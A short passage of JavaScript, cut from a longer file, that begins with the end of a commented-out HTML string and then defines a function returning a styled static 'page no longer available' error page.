required."})();</script></body></html>';
//    }

function renderErrorPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Page Unavailable</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #f3f4f6;
      margin: 0;
    }
    .card {
      background: white;
      border-radius: 8px;
      padding: 48px;
      text-align: center;
      box-shadow: 0 2px 16px rgba(0,0,0,0.1);
      max-width: 420px;
    }
    h2 { color: #333; margin-bottom: 12px; }
    p { color: #666; }
  </style>
</head>
<body>
  <div class="card">
    <h2>This page is no longer available</h2>
    <p>The requested resource has been removed or is temporarily unavailable.</p>
  </div>
</body>
</html>`;
}
